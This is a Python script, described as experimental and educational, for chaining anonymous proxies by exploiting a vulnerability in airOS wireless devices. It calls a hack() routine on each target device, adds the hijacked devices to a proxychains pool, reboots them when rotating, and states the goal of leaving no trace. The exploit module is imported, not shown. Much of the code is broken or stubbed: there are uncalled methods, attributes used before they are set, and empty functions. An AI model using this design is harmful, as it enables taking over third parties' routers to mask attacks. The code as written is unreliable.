#!/usr/bin/env python
"""
    Anonymous proxy chaining with airos vulnerability.
    Automatic system to not leave any trace.
    Experimental stuff, use with care
    Made for educational purposes (basically for that article in my blog)
    Actually, abstracting this of the airos part, you could do something nice.
    But airos are a powerful tool (and we have 4 of our own,

   in the guifi.net aragon stuff)
    It is quite interesting to think how a so-simple security
    problem can be used for so many things.
"""

import json
import sys
import os
import string
import mechanize
import random
import crypt
from airos import Airos

class ProxiePool(object):
    """
        Main proxy manager
    """
    def __init__(self):
        self.proxy_list = self.initialize_proxy_list()
        self.changing_proxy_state = False
        self.file_config = "~/.proxiepool.json"
        self.pool = {}
        self.pool_size = 10

    def initialize_proxy_list(self):
        """
            Get the proxy list or generate one
        """
        if not self.file_config and not os.path.isfile(self.file_config):
            with open(sys.argv[1], 'r') as file_:
                proxy_list = json.loads(file_.read)
        else:
            with open(self.file_config, 'r') as file_:
                proxy_list = json.loads(file_.read)

        for proxy in proxy_list:
            self.add_proxy(proxy)

    def check_pool(self):
        """
        Checks the current pool size, and fills it if a proxy is not there
        """
        if len(self.pool) < self.pool_size and not self.changing_proxy_state:
            self.changing_proxy_state = True
            self.add_proxy(self.next_proxy)
            self.changing_proxy_state = False

    def add_proxy(self, proxy):
        """
            Hack a new proxy to add it
        """
        future_proxy = Airos(proxy)
        future_proxy.hack()
        self.proxy_list.append(future_proxy)

    def remove_proxy(self, proxy):
        """
            Remove a proxy
        """
        if proxy in self.pool:
            if proxy.ipaddr == proxy:
                proxy.reboot()
                self.proxy_list = filter(lambda a: a != proxy, self.proxy_list)

    def reboot_remote_proxy(self, proxy):
        """
            Reboot a remote proxy
        """
        if proxy in self.pool:
            if proxy.ipaddr == proxy:
                proxy.reboot()
                return proxy

    @property
    def next_proxy(self):
        """
            We'll only request this when changing_proxy_state is true
            so we don't have to worry about state on this.
            Meaning that we cannot get the same proxy twice.
            Anyway, we need to check that fucking priority.
            I won't be implementing priority yet.
        """
        for prox in self.ordered_proxy_list:
            if prox not in self.pool:
                return prox

    @property
    def ordered_proxy_list(self):
        """
            Returns the list ordered by priority
        """
        return sorted(self.proxy_list, key=lambda k: k.priority)

    def change_proxie(self, current_proxy):
        """
            Check proxie priority
            It should be calculated having in mind the max number of proxies
        self.changing_proxy_state = False
            Then change the proxy to a new one
            (so, temporary the pool will have
            an element less, we have to have this in mind.
        """
        self.changing_proxy_state = True
        self.add_proxy(self.next_proxy)
        self.remove_proxy(current_proxy)
        self.changing_proxy_state = False

    def create_config(self):
        """
            Create a proxychains config with the current proxies.
            The VM should be connected to a socks5 proxy (proxychains with another conf file)
            Then, when we need to change a proxy, we reset the socks5 proxy that is being proxified
            In this case we'll be launching a sshd
            proxychains -f main_file sshd -p 8080 -f ~/.airos/local.conf
            proxychains -f the_file_configured_to_use_local_ssh_as_proxy
            then each time we kill the sshd and restart it.
        """
        # TODO write proxychains config file
        return True

    def start_sshd(self):
        """
            Start a proxified sshd
        """

    def listen(self):
        """
            This is the main foo.
            This should react to calls like next_proxy by executing
                self.next_proxy()
                self.create_config()
                self.kill_sshd()
                self.start_sshd()
        """
